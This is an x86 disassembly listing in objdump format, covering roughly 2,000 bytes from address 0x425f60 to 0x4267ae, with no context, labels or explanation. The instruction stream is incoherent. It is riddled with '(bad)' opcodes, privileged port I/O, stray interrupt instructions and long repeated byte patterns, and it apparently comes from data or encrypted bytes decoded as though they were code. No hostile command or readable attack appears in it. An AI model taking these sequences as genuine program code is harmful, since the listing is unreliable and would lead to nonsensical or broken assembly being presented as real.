  425f60:	xor    al,0x32
  425f63:	or     DWORD PTR [esi-0x3],eax
  425f66:	or     al,0xb2
  425f68:	mov    esi,0x87f0800c
  425f6d:	and    BYTE PTR [edi+0x537c5332],0xa4
  425f74:	mov    dl,0xba
  425f76:	sub    edi,edi
  425f78:	je     0x425fca
  425f7a:	ja     0x425fc1
  425f7c:	xor    BYTE PTR [edi+0x71],0xbe
  425f80:	lds    edi,FWORD PTR [edx]
  425f82:	lea    ecx,[ebp-0x7f788880]
  425f88:	lock xor cl,BYTE PTR [ecx]
  425f8b:	inc    esi
  425f8c:	std    
  425f8d:	or     al,0xb2
  425f8f:	mov    esi,0x87f0800c
  425f94:	and    BYTE PTR [edi+0x29bab232],0x80
  425f9b:	lock adc eax,0xa4537c53
  425fa1:	in     eax,dx
  425fa2:	mov    dl,0x8b
  425fa4:	push   DWORD PTR [esi+esi*4-0x42]
  425fa8:	arpl   WORD PTR [edx-0x72f412f7],si
  425fae:	lea    ecx,[ebp+0x171a780]
  425fb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425fb5:	jae    0x425fa6
  425fb7:	inc    ebx
  425fb8:	std    
  425fb9:	push   eax
  425fba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fbb:	xor    eax,0x803df050
  425fc0:	lock test DWORD PTR [eax+0x46097a77],0x86b20cb2
  425fcb:	or     al,0x80
  425fcd:	ja     0x425fc6
  425fcf:	and    BYTE PTR [edi+0x2984b27a],0x80
  425fd6:	ja     0x425fa0
  425fd8:	push   ebx
  425fd9:	sub    dl,BYTE PTR [ebx-0x5c]
  425fdc:	call   DWORD PTR [ecx]
  425fde:	and    BYTE PTR [edi-0x7db9f675],0xc
  425fe5:	push   eax
  425fe6:	ja     0x42603d
  425fe8:	xor    BYTE PTR [edi-0x38],0x6e
  425fec:	out    0x55,eax
  425fee:	in     eax,dx
  425fef:	mov    dl,0xa6
  425ff1:	mov    dl,0xc4
  425ff3:	or     al,0x80
  425ff5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ff6:	mov    edx,DWORD PTR [ebx-0x5c]
  425ff9:	xor    BYTE PTR [edi+0x55b79455],ah
  425fff:	and    BYTE PTR [edi-0x740f7f38],0x9
  426006:	inc    esi
  426007:	adc    DWORD PTR [edx+esi*4],ecx
  42600a:	test   BYTE PTR [ecx],ch
  42600c:	xor    BYTE PTR [edi-0x38],0xb2
  426010:	mov    esi,0x8bf0800c
  426015:	push   ebx
  426016:	jo     0x425fca
  426018:	test   BYTE PTR [ecx],ch
  42601a:	xor    BYTE PTR [edi+0x55],0x53
  42601e:	lods   al,BYTE PTR ds:[esi]
  42601f:	jmp    DWORD PTR [eax+0x935f080]
  426025:	pop    esp
  426026:	xor    BYTE PTR [ebx+0x74],al
  426029:	xor    esi,DWORD PTR [edx+0x50f7f080]
  42602f:	ja     0x426086
  426031:	xor    BYTE PTR [edi+0x7a],0x9
  426035:	inc    esi
  426036:	mov    dl,0xc
  426038:	mov    dl,0x86
  42603a:	or     al,0x80
  42603c:	ja     0x426035
  42603e:	and    BYTE PTR [edi+0x2984b27a],0x80
  426045:	ja     0x42607c
  426047:	or     DWORD PTR [ebp+ecx*4-0x33],ebx
  42604b:	add    eax,0xa6a453a7
  426050:	adc    ebp,ecx
  426052:	mov    dl,0xa6
  426054:	xchg   esp,eax
  426055:	xchg   BYTE PTR [ebx+0x70],dl
  426058:	xchg   BYTE PTR fs:[edi+0x36092643],cl
  42605f:	mov    dl,0xc
  426061:	mov    dl,0x84
  426063:	or     al,0x57
  426065:	fstp   DWORD PTR [eax-0x21]
  426068:	adc    DWORD PTR [ebx+0x11],edx
  42606b:	addr16 out 0x58,al
  42606e:	fist   WORD PTR [ecx]
  426070:	xlat   BYTE PTR ds:[ebx]
  426071:	aaa    
  426072:	arpl   WORD PTR [ecx],dx
  426074:	xlat   BYTE PTR ds:[ebx]
  426075:	dec    esi
  426076:	or     BYTE PTR [eax+eax*4],0xf0
  42607a:	jno    0x426068
  42607c:	cmp    al,BYTE PTR [eax+0x65ed55f0]
  426082:	out    dx,eax
  426083:	(bad)  
  426084:	aad    0xe
  426086:	or     BYTE PTR [eax+eax*4],0xf0
  42608a:	jno    0x426078
  42608c:	cmp    al,BYTE PTR [eax+0x77eceff0]
  426092:	push   ebp
  426093:	xor    BYTE PTR [eax],0x3a
  426096:	out    dx,eax
  426097:	in     eax,dx
  426098:	ja     0x4260cf
  42609a:	or     al,0x4d
  42609c:	lock cmp eax,0x4d234f09
  4260a2:	dec    ebp
  4260a3:	dec    ebp
  4260a4:	les    ebp,FWORD PTR [edi]
  4260a6:	xchg   BYTE PTR fs:[edi+0x77802643],cl
  4260ad:	adc    eax,0x7c45773a
  4260b2:	ja     0x42611e
  4260b4:	rcr    BYTE PTR [eax-0x21],1
  4260b7:	adc    DWORD PTR [eax-0x59],edx
  4260ba:	jbe    0x42603c
  4260bc:	ja     0x426128
  4260be:	xor    al,0x76
  4260c1:	or     DWORD PTR [esi-0x3],eax
  4260c4:	or     al,0xb2
  4260c6:	mov    esi,0x6af0800c
  4260cb:	and    BYTE PTR [edi+0x29bab276],0x80
  4260d2:	lock and DWORD PTR [eax+0x537c5330],eax
  4260d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4260da:	push   DWORD PTR [ecx+eax*1+0x75]
  4260de:	mov    dl,0xe5
  4260e0:	xor    al,0x45
  4260e3:	arpl   di,bp
  4260e5:	rcl    DWORD PTR [ebp-0x80],cl
  4260e8:	ja     0x42615b
  4260ea:	in     al,dx
  4260eb:	ja     0x426102
  4260ed:	push   eax
  4260ee:	ja     0x426161
  4260f0:	sub    BYTE PTR [ebp-0x12],0x50
  4260f4:	ja     0x42610b
  4260f6:	xor    BYTE PTR [edi-0x79],0x80
  4260fa:	lock xor cl,BYTE PTR [ecx]
  4260fd:	inc    esi
  4260fe:	std    
  4260ff:	or     al,0xb2
  426101:	mov    esi,0x87f0800c
  426106:	and    BYTE PTR [edi+0x53a45332],0x7c
  42610d:	push   DWORD PTR [edx+esi*4-0x46]
  426111:	sub    DWORD PTR [edi+0x77],ebx
  426114:	adc    eax,0xdbf4f09
  426119:	dec    ebp
  42611a:	dec    ebp
  42611b:	xor    al,0x8a
  42611e:	adc    BYTE PTR [edi-0x4daeac76],0xbe
  426125:	or     al,0xe2
  426127:	or     eax,0xb2f7539d
  42612c:	clc    
  42612d:	sub    edi,edi
  42612f:	inc    BYTE PTR [eax-0x587f7569]
  426135:	mov    dl,BYTE PTR [ebx+0x7e]
  426138:	mov    dl,0x7
  42613a:	or     al,0x53
  42613c:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  426143:	inc    BYTE PTR [eax-0x587f7569]
  426149:	mov    dl,BYTE PTR [ebx+0x7e]
  42614c:	mov    dl,0x7
  42614e:	or     al,0x53
  426150:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  426157:	inc    BYTE PTR [eax-0x587f7569]
  42615d:	mov    dl,BYTE PTR [ebx+0x7e]
  426160:	push   ebx
  426161:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  426168:	call   DWORD PTR [esp+ebp*8+0x520150fe]
  42616f:	dec    ebp
  426170:	dec    ebp
  426171:	dec    ebp
  426172:	xor    al,0x81
  426175:	adc    BYTE PTR [edi-0x79587f7a],0x53
  42617c:	jle    0x4261d1
  42617e:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  426185:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  42618c:	dec    ebp
  42618d:	dec    ebp
  42618e:	xor    al,0x21
  426191:	xor    BYTE PTR [eax],0x80
  426194:	xchg   edi,eax
  426195:	mov    al,BYTE PTR [eax+0x7f808aa7]
  42619b:	or     dl,BYTE PTR [ebx+0x7e]
  42619e:	push   ebx
  42619f:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  4261a6:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  4261ad:	dec    ebp
  4261ae:	dec    ebp
  4261af:	xor    al,0x1d
  4261b2:	adc    BYTE PTR [edi-0x4d08ace3],0xf8
  4261b9:	sub    DWORD PTR [ebx+0x51],edx
  4261bc:	mov    dl,0xbe
  4261be:	or     al,0xff
  4261c0:	inc    BYTE PTR [eax-0x587f7569]
  4261c6:	mov    dl,BYTE PTR [ebx-0x7e]
  4261c9:	xor    BYTE PTR [edi-0x76],0x53
  4261cd:	jle    0x426181
  4261cf:	mov    ah,0x29
  4261d1:	mov    dl,0x7
  4261d3:	or     al,0xff
  4261d5:	xchg   esp,eax
  4261d6:	and    BYTE PTR [edi-0x1203ac76],0xc6
  4261dd:	or     eax,0xb20c86b2
  4261e2:	mov    ah,0x29
  4261e4:	push   DWORD PTR [esp+ebp*8-0x9]
  4261e8:	push   eax
  4261e9:	inc    ecx
  4261ea:	sbb    ch,dl
  4261ec:	dec    ebp
  4261ed:	dec    ebp
  4261ee:	dec    ebp
  4261ef:	xor    al,0x8a
  4261f2:	adc    BYTE PTR [edi-0x4daeac76],0xbe
  4261f9:	or     al,0xe2
  4261fb:	or     eax,0xb2f7539d
  426200:	clc    
  426201:	sub    edi,edi
  426203:	inc    BYTE PTR [eax-0x587f7569]
  426209:	mov    dl,BYTE PTR [ebx+0x7e]
  42620c:	mov    dl,0x7
  42620e:	or     al,0x53
  426210:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  426217:	inc    BYTE PTR [eax-0x587f7569]
  42621d:	mov    dl,BYTE PTR [ebx+0x7e]
  426220:	mov    dl,0x7
  426222:	or     al,0x53
  426224:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  42622b:	inc    BYTE PTR [ecx]
  42622d:	xchg   edi,eax
  42622e:	adc    DWORD PTR [eax+0x16],0x1
  426232:	aad    0x4d
  426234:	dec    ebp
  426235:	dec    ebp
  426236:	add    DWORD PTR [ecx],eax
  426238:	push   edx
  426239:	dec    ebp
  42623a:	dec    ebp
  42623b:	dec    ebp
  42623c:	xchg   esi,eax
  42623d:	xor    al,0x8a
  426240:	adc    BYTE PTR [edi-0x7faeac76],0xd7
  426247:	sub    eax,0xbeb2f753
  42624c:	or     al,0xb2
  42624e:	clc    
  42624f:	sub    edi,edi
  426251:	(bad)  
  426252:	xchg   esi,eax
  426253:	add    DWORD PTR [eax+ecx*4-0x73],ecx
  426257:	lea    ecx,[ebp+0x3e4c800a]
  42625d:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  426263:	xchg   edi,eax
  426264:	and    eax,0x3acd4c80
  426269:	lea    ecx,[ebp-0x7fde88b0]
  42626f:	ja     0x426260
  426271:	sub    bh,0xec
  426274:	lock and DWORD PTR [eax-0x10],edx
  426278:	and    DWORD PTR [eax-0x687f3710],eax
  42627e:	mov    ecx,DWORD PTR [ecx]
  426280:	inc    esi
  426281:	mov    dh,0xc
  426283:	mov    dl,0x7
  426285:	or     al,0x80
  426287:	xchg   edi,eax
  426288:	enter  0xd780,0x8b
  42628c:	push   ebx
  42628d:	or     esi,DWORD PTR [edx-0x687fd608]
  426293:	enter  0x2a53,0xff
  426297:	push   ecx
  426298:	adc    bh,0x8b
  42629b:	or     DWORD PTR [esi-0x3e],eax
  42629e:	or     al,0xb2
  4262a0:	mov    BYTE PTR [eax+eax*4],cl
  4262a3:	xlat   BYTE PTR ds:[ebx]
  4262a4:	enter  0xa780,0x8b
  4262a8:	push   ebx
  4262a9:	pushf  
  4262aa:	push   ebx
  4262ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4262ac:	call   DWORD PTR [esp+ebp*8-0x37687f02]
  4262b3:	mov    dl,0x2
  4262b5:	sub    DWORD PTR [eax+0x46098bd7],eax
  4262bb:	ret    0xb20c
  4262be:	mov    BYTE PTR [eax+eax*4],cl
  4262c1:	xlat   BYTE PTR ds:[ebx]
  4262c2:	enter  0xa780,0x8b
  4262c6:	push   ebx
  4262c7:	pushf  
  4262c8:	push   ebx
  4262c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4262ca:	call   DWORD PTR [esp+ebp*8-0x37687f02]
  4262d1:	mov    dl,0x2
  4262d3:	sub    DWORD PTR [eax+0x46098bd7],eax
  4262d9:	ret    0xb20c
  4262dc:	mov    BYTE PTR [eax+eax*4],cl
  4262df:	xlat   BYTE PTR ds:[ebx]
  4262e0:	enter  0x9c53,0x80
  4262e4:	out    0x8b,eax
  4262e6:	push   ebx
  4262e7:	dec    ebp
  4262e8:	call   FWORD PTR [esp+ebp*8+0x4d0a96fe]
  4262ef:	xlat   BYTE PTR ds:[ebx]
  4262f0:	and    DWORD PTR [edx-0x6979d6fe],esi
  4262f6:	xchg   DWORD PTR [ebp+0x4d],ecx
  4262f9:	xor    BYTE PTR [edi-0x51],0xab
  4262fd:	test   eax,0x81fb70a3
  426302:	lea    edx,[edi-0x78127880]
  426308:	inc    ebp
  426309:	xchg   ebx,eax
  42630a:	cdq    
  42630b:	fwait
  42630c:	push   ebx
  42630d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42630e:	push   ebx
  42630f:	jo     0x42638d
  426311:	ja     0x426295
  426313:	fstp   DWORD PTR [eax-0x21]
  426316:	adc    DWORD PTR [esi-0x7a],ebx
  426319:	pop    DWORD PTR [ebx+0x26]
  42631c:	push   eax
  42631d:	ja     0x4262a2
  42631f:	jl     0x426398
  426321:	xchg   ah,ah
  426323:	pop    eax
  426324:	fist   WORD PTR [ecx]
  426326:	push   eax
  426327:	ja     0x4262b0
  426329:	jl     0x4263a2
  42632b:	xchg   esi,esi
  42632d:	mov    ds:0x777c386f,eax
  426332:	enter  0xe9f6,0x6f
  426336:	cmp    BYTE PTR [edi+esi*2+0x32],bh
  42633a:	cli    
  42633b:	and    al,0x6f
  42633d:	cmp    BYTE PTR [edi+esi*2+0x32],bh
  426341:	hlt    
  426342:	and    al,0x6f
  426344:	cmp    BYTE PTR [edi+esi*2-0x75],bh
  426348:	mul    BYTE PTR [esi+ebp*8]
  42634b:	cmp    BYTE PTR [ecx],al
  42634d:	ja     0x42633d
  42634f:	push   eax
  426350:	ja     0x4262dd
  426352:	xor    BYTE PTR [edi+0x1d],0x80
  426356:	bound  esi,QWORD PTR [esi]
  426358:	cmp    cl,BYTE PTR [ebp+0x1d77808d]
  42635e:	xor    al,0x1d
  426361:	or     ch,0x2e
  426364:	cmp    cl,BYTE PTR [ebp-0x7f8e7f73]
  42636a:	pop    ebp
  42636b:	in     al,dx
  42636c:	out    0x65,al
  42636e:	adc    BYTE PTR [edi+0x26508082],0x3a
  426375:	lea    ecx,[ebp-0x7f0618b0]
  42637b:	out    0x83,eax
  42637d:	or     DWORD PTR [esi-0x7b],eax
  426380:	or     al,0xb2
  426382:	popa   
  426383:	or     al,0x80
  426385:	out    0x82,eax
  426387:	and    BYTE PTR [edi-0x583d5d7d],0xc7
  42638e:	add    al,0xd4
  426390:	push   ebx
  426391:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426392:	mov    dl,0xbc
  426394:	sub    DWORD PTR [eax+0x6394ff5f],eax
  42639a:	pushf  
  42639b:	xlat   BYTE PTR ds:[ebx]
  42639c:	push   edx
  42639d:	sbb    BYTE PTR [ecx],0x50
  4263a0:	xchg   edi,eax
  4263a1:	mov    eax,DWORD PTR [eax-0x687fea69]
  4263a7:	jno    0x426329
  4263a9:	xchg   edi,eax
  4263aa:	and    DWORD PTR [ecx],eax
  4263ac:	xchg   edi,eax
  4263ad:	test   BYTE PTR [edx-0x697428b3],ch
  4263b3:	or     bl,BYTE PTR [ecx+0x11dd74d]
  4263b9:	ja     0x4263b4
  4263bb:	dec    ebp
  4263bc:	xlat   BYTE PTR ds:[ebx]
  4263bd:	out    dx,eax
  4263be:	dec    ebp
  4263bf:	xlat   BYTE PTR ds:[ebx]
  4263c0:	enter  0xd74d,0x32
  4263c4:	dec    ebp
  4263c5:	xlat   BYTE PTR ds:[ebx]
  4263c6:	xchg   DWORD PTR [edx],ecx
  4263c8:	add    DWORD PTR [edi-0x76],esi
  4263cb:	or     al,BYTE PTR [esi+0x4d4d4bab]
  4263d1:	push   eax
  4263d2:	ja     0x4263f1
  4263d4:	xor    BYTE PTR [edi+0x1d],0x80
  4263d8:	lock and eax,0x80159250
  4263de:	ja     0x426405
  4263e0:	jl     0x42636f
  4263e2:	in     al,dx
  4263e3:	lea    ecx,[ebp-0x7b887f73]
  4263e9:	xor    al,0x25
  4263ec:	push   eax
  4263ed:	xchg   edx,eax
  4263ee:	out    dx,al
  4263ef:	xor    BYTE PTR [edi+0x71],0x80
  4263f3:	lock and eax,0x80ef9250
  4263f9:	ja     0x426410
  4263fb:	xor    al,0x25
  4263fe:	push   eax
  4263ff:	xchg   edx,eax
  426400:	and    DWORD PTR [eax+0x6d7c2577],eax
  426406:	and    eax,0x8d8d8d3a
  42640b:	les    ebx,FWORD PTR [edi]
  42640d:	xor    BYTE PTR [edi+0x1d],0x80
  426411:	lock sbb eax,0x3a2ecd80
  426417:	lea    ecx,[ebp+0x3a265080]
  42641d:	lea    ecx,[ebp+0x3a438d80]
  426423:	push   eax
  426424:	ja     0x4263b0
  426426:	xor    BYTE PTR [edi-0x76],0xab
  42642a:	test   eax,0x1dfb70a3
  42642f:	lea    edx,[edi+0x77808780]
  426435:	and    DWORD PTR [edx-0x72c5c179],esp
  42643b:	lea    edx,[ebx-0x9986467]
  426441:	and    al,0x6f
  426443:	cmp    BYTE PTR [ecx],cl
  426445:	dec    edi
  426446:	mov    esi,0x808d8da6
  42644b:	ja     0x4264be
  42644d:	addr16 cmc 
  42644f:	and    al,0x6f
  426451:	cmp    BYTE PTR [ecx],cl
  426453:	dec    edi
  426454:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426455:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426456:	lea    ecx,[ebp-0x26788884]
  42645c:	pop    eax
  42645d:	fist   WORD PTR [ecx]
  42645f:	pop    esi
  426460:	xchg   BYTE PTR [edi+0x77502643],cl
  426466:	xor    bh,BYTE PTR [edi+esi*2-0x7]
  42646a:	in     al,0x58
  42646c:	fist   WORD PTR [ecx]
  42646e:	push   eax
  42646f:	ja     0x4263f7
  426471:	xor    BYTE PTR [edi-0x11],0x50
  426475:	ja     0x42643f
  426477:	xor    BYTE PTR [edi-0x38],0x80
  42647b:	int    0x86
  42647d:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  426483:	lea    edx,[eax+0x77]
  426486:	mov    esp,DWORD PTR [eax+0x7f]
  426489:	cmp    BYTE PTR [ebp+0x38975e8d],cl
  42648f:	lea    ecx,[ebp+0x5a7750b9]
  426495:	in     eax,dx
  426496:	push   0xd
  426498:	mov    ecx,0x80d17750
  42649d:	mov    dl,0xb9
  42649f:	push   eax
  4264a0:	ja     0x4264b8
  4264a2:	pop    esi
  4264a3:	int3   
  4264a4:	cmp    BYTE PTR [ebp-0x46087f73],cl
  4264aa:	push   eax
  4264ab:	xchg   edi,eax
  4264ac:	loope  0x4264af
  4264ae:	push   edx
  4264af:	or     al,0x1
  4264b1:	lahf   
  4264b2:	stos   BYTE PTR es:[edi],al
  4264b3:	cmp    BYTE PTR [esi-0x47],0x50
  4264b7:	xchg   edi,eax
  4264b8:	push   ds
  4264b9:	adc    BYTE PTR [ecx+edi*4-0x121668b0],0xfb
  4264c1:	jle    0x42647c
  4264c3:	push   eax
  4264c4:	xchg   edi,eax
  4264c5:	int    0x1
  4264c7:	xchg   esi,eax
  4264c8:	push   ebp
  4264c9:	add    BYTE PTR [ebp-0x1518af47],0xed
  4264d0:	jl     0x42654c
  4264d2:	mov    ecx,0x10fe750
  4264d7:	fistp  WORD PTR [ecx-0x47]
  4264da:	push   eax
  4264db:	out    0x4c,eax
  4264dd:	mov    ecx,0xb9107750
  4264e2:	push   eax
  4264e3:	xlat   BYTE PTR ds:[ebx]
  4264e4:	pop    DWORD PTR [eax+0x7750b974]
  4264ea:	inc    ecx
  4264eb:	mov    ecx,0x4d6d1850
  4264f0:	dec    ebp
  4264f1:	dec    ebp
  4264f2:	in     eax,dx
  4264f3:	push   0x62
  4264f5:	mov    ecx,0x4dd84f50
  4264fa:	dec    ebp
  4264fb:	dec    ebp
  4264fc:	add    DWORD PTR [edx+0x4f50b985],edx
  426502:	jne    0x426551
  426504:	dec    ebp
  426505:	dec    ebp
  426506:	in     eax,dx
  426507:	push   0xffffffd4
  426509:	mov    ecx,0x4d794f50
  42650e:	dec    ebp
  42650f:	dec    ebp
  426510:	add    DWORD PTR [edx+0x4f50b971],edx
  426516:	jge    0x426565
  426518:	dec    ebp
  426519:	dec    ebp
  42651a:	in     eax,dx
  42651b:	push   0xffffffc0
  42651d:	mov    ecx,0x4dda4f50
  426522:	dec    ebp
  426523:	dec    ebp
  426524:	mov    ecx,0x4d310150
  426529:	dec    ebp
  42652a:	dec    ebp
  42652b:	xor    BYTE PTR [ecx+edi*4+0x50],0x4f
  426530:	mov    cl,0x4d
  426532:	dec    ebp
  426533:	dec    ebp
  426534:	xor    BYTE PTR [edi-0x79],0x80
  426538:	lock xor cl,BYTE PTR [ecx]
  42653b:	inc    esi
  42653c:	std    
  42653d:	or     al,0xb2
  42653f:	mov    esi,0x87f0800c
  426544:	adc    BYTE PTR [edi-0x385893ce],0x4
  42654b:	aam    0x53
  42654d:	jl     0x4265a2
  42654f:	jb     0x426503
  426551:	mov    edx,0xc4fbff29
  426556:	xchg   edx,eax
  426557:	add    ebp,edx
  426559:	ja     0x4265b5
  42655b:	mov    ecx,0x5c09a180
  426560:	sbb    DWORD PTR [ecx],ecx
  426562:	pop    esp
  426563:	jo     0x4265b8
  426565:	adc    DWORD PTR [edx-0x72c7163e],esp
  42656b:	lea    esi,[esi+0x9bab207]
  426571:	(bad)  
  426572:	(bad)  
  426573:	adc    BYTE PTR [ecx+0x2f],al
  426576:	or     DWORD PTR ds:0xf0804d4d,0xfffffff9
  42657d:	adc    BYTE PTR [edi-0x49b9f67a],0xc
  426584:	mov    dl,0x7
  426586:	or     al,0x80
  426588:	xchg   edi,eax
  426589:	stc    
  42658a:	adc    bh,0x86
  42658d:	push   ebx
  42658e:	sub    dl,BYTE PTR [ebx+0xb]
  426591:	call   DWORD PTR [ecx-0x4e]
  426594:	clc    
  426595:	sub    esp,ebp
  426597:	mov    dl,0xed
  426599:	mov    ebp,DWORD PTR [edi-0x29]
  42659c:	icebp  
  42659d:	xor    BYTE PTR [edi-0x79],0x80
  4265a1:	lock xor cl,BYTE PTR [ecx]
  4265a4:	inc    esi
  4265a5:	std    
  4265a6:	or     al,0xb2
  4265a8:	mov    esi,0x87f0800c
  4265ad:	adc    BYTE PTR [edi+0x537c5332],0x72
  4265b4:	mov    dl,0xba
  4265b6:	sub    edi,edi
  4265b8:	sti    
  4265b9:	les    edx,FWORD PTR [edx-0x32882aff]
  4265bf:	mov    ecx,0x5c09a180
  4265c4:	sbb    DWORD PTR [ecx],ecx
  4265c6:	pop    esp
  4265c7:	jo     0x42661c
  4265c9:	adc    DWORD PTR [edx-0x72c7163e],esp
  4265cf:	lea    esi,[esi+0x9bab207]
  4265d5:	(bad)  
  4265d6:	(bad)  
  4265d7:	adc    BYTE PTR [ecx+0x2f],al
  4265da:	inc    ecx
  4265db:	or     eax,0xf0804d4d
  4265e0:	stc    
  4265e1:	adc    BYTE PTR [edi-0x49b9f67a],0xc
  4265e8:	mov    dl,0x7
  4265ea:	or     al,0x80
  4265ec:	xchg   edi,eax
  4265ed:	stc    
  4265ee:	adc    bh,0x86
  4265f1:	push   ebx
  4265f2:	sub    dl,BYTE PTR [ebx+0xb]
  4265f5:	call   DWORD PTR [ecx-0x4e]
  4265f8:	clc    
  4265f9:	sub    esp,ebp
  4265fb:	mov    dl,0xed
  4265fd:	mov    ecx,DWORD PTR [edi+edx*8-0x78887f0f]
  426604:	xor    al,0x32
  426607:	or     DWORD PTR [esi-0x3],eax
  42660a:	or     al,0xb2
  42660c:	mov    esi,0x87f0800c
  426611:	adc    BYTE PTR [edi+0x537c5332],0x72
  426618:	mov    dl,0xba
  42661a:	sub    edi,edi
  42661c:	sti    
  42661d:	les    esi,FWORD PTR [ebp+0x1]
  426620:	push   esi
  426621:	ja     0x426690
  426623:	dec    ebp
  426624:	dec    ebp
  426625:	dec    ebp
  426626:	mov    ecx,0x5c09a180
  42662b:	sbb    DWORD PTR [ecx],ecx
  42662d:	pop    esp
  42662e:	jo     0x426683
  426630:	adc    DWORD PTR [edx-0x72c7163e],esp
  426636:	lea    esi,[esi+0x9bab207]
  42663c:	(bad)  
  42663d:	(bad)  
  42663e:	adc    BYTE PTR [ecx+0x2f],al
  426641:	prefetchw BYTE PTR [ebp+0x4d]
  426645:	xor    al,0xf9
  426648:	adc    BYTE PTR [edi-0x49b9f67a],0xc
  42664f:	mov    dl,0x7
  426651:	or     al,0x80
  426653:	xchg   edi,eax
  426654:	stc    
  426655:	adc    bh,0x86
  426658:	push   ebx
  426659:	sub    dl,BYTE PTR [ebx+0xb]
  42665c:	call   DWORD PTR [ecx-0x4e]
  42665f:	clc    
  426660:	sub    esp,ebp
  426662:	mov    dl,0xed
  426664:	mov    ebp,edi
  426666:	xlat   BYTE PTR ds:[ebx]
  426667:	pop    esp
  426668:	add    DWORD PTR [edi-0x7],ecx
  42666b:	or     eax,0x77504d4d
  426670:	mov    eax,DWORD PTR [eax+0x49608b77]
  426676:	cmp    eax,0xef50d146
  42667b:	icebp  
  42667c:	outs   dx,BYTE PTR ds:[esi]
  42667d:	sub    ecx,DWORD PTR [ebx]
  42667f:	sub    BYTE PTR [eax+0xa],dl
  426682:	out    dx,al
  426683:	or     BYTE PTR [edi-0x7],0xd
  426687:	dec    ebp
  426688:	dec    ebp
  426689:	sbb    BYTE PTR [eax-0x7a],0xd
  42668d:	dec    ebp
  42668e:	dec    ebp
  42668f:	push   eax
  426690:	xlat   BYTE PTR ds:[ebx]
  426691:	xchg   dl,bh
  426693:	and    ah,BYTE PTR [edi+ebp*2]
  426696:	cmp    BYTE PTR [ebx-0x4e],ah
  426699:	or     DWORD PTR [edi-0x2a],ecx
  42669c:	cmp    cl,BYTE PTR [ebp-0x7968a073]
  4266a2:	or     DWORD PTR [edi+0x6e],ecx
  4266a5:	cmp    cl,BYTE PTR [ebp+0x38305e8d]
  4266ab:	lea    ecx,[ebp-0x74b0af47]
  4266b1:	or     eax,0x74804d4d
  4266b6:	mov    ecx,0xd854f50
  4266bb:	dec    ebp
  4266bc:	dec    ebp
  4266bd:	pop    esi
  4266be:	daa    
  4266bf:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  4266c5:	mov    cl,BYTE PTR ds:0x2c5e4d4d
  4266cb:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  4266d1:	or     eax,0x5e4d4d0d
  4266d6:	pop    ds
  4266d7:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  4266dd:	lea    ecx,[ebp+0x4d]
  4266e0:	dec    ebp
  4266e1:	in     eax,dx
  4266e2:	push   0xffffffe8
  4266e4:	cmp    ch,0xb9
  4266e7:	push   eax
  4266e8:	add    DWORD PTR [ecx*2+0x77804d4d],ecx
  4266ef:	jno    0x426751
  4266f1:	jae    0x42672b
  4266f3:	lea    ecx,[ebp-0x11feaf47]
  4266f9:	dec    ebp
  4266fa:	dec    ebp
  4266fb:	dec    ebp
  4266fc:	in     eax,dx
  4266fd:	mov    dl,0xaa
  4266ff:	mov    ecx,0x4d6f0150
  426704:	dec    ebp
  426705:	dec    ebp
  426706:	pusha  
  426707:	push   edi
  426708:	cmp    BYTE PTR [ebp+0x150b98d],cl
  42670e:	out    dx,eax
  42670f:	dec    ebp
  426710:	dec    ebp
  426711:	dec    ebp
  426712:	in     eax,dx
  426713:	mov    dl,0x9d
  426715:	mov    ecx,0x4da60150
  42671a:	dec    ebp
  42671b:	dec    ebp
  42671c:	adc    BYTE PTR [ecx],0xb9
  42671f:	push   eax
  426720:	add    DWORD PTR [ecx],esp
  426722:	dec    ebp
  426723:	dec    ebp
  426724:	dec    ebp
  426725:	pusha  
  426726:	in     eax,dx
  426727:	cmp    BYTE PTR [ebp+0x150b98d],cl
  42672d:	mov    eax,ds:0x534d4d4d
  426732:	cld    
  426733:	pusha  
  426734:	xor    ch,BYTE PTR [esi-0x73]
  426737:	lea    edi,[ecx+0x4d710150]
  42673d:	dec    ebp
  42673e:	dec    ebp
  42673f:	mov    dl,0x86
  426741:	or     al,0x60
  426743:	sbb    ebx,DWORD PTR [eax]
  426745:	lea    ecx,[ebp-0x6ffeaf47]
  42674b:	dec    ebp
  42674c:	dec    ebp
  42674d:	dec    ebp
  42674e:	pusha  
  42674f:	fwait
  426750:	xchg   BYTE PTR [ebp+0x150b98d],cl
  426756:	adc    eax,0x804d4d4d
  42675b:	lock jno 0x42674b
  42675e:	add    eax,0x29bab20d
  426763:	push   DWORD PTR [edx+0xd164f50]
  426769:	dec    ebp
  42676a:	dec    ebp
  42676b:	xor    BYTE PTR [edi+0x21],0x80
  42676f:	lock and DWORD PTR [ebx-0x4],edx
  426773:	mov    dl,0x86
  426775:	or     al,0xed
  426777:	add    eax,0x29bab20d
  42677c:	push   DWORD PTR [edx+0x1e4f0f7c]
  426782:	or     eax,0x4d4d4d4d
  426787:	lea    ecx,[ebp+0xd164f01]
  42678d:	dec    ebp
  42678e:	dec    ebp
  42678f:	or     al,BYTE PTR [eax-0xf7f8e89]
  426795:	jno    0x4267ea
  426797:	cld    
  426798:	mov    dl,0x86
  42679a:	or     al,0xed
  42679c:	add    eax,0x29bab20d
  4267a1:	push   DWORD PTR [edx-0x74b0fef6]
  4267a7:	or     eax,0x800a4d4d
  4267ac:	ja     0x426776
  4267ae:	or     ch,0x3e
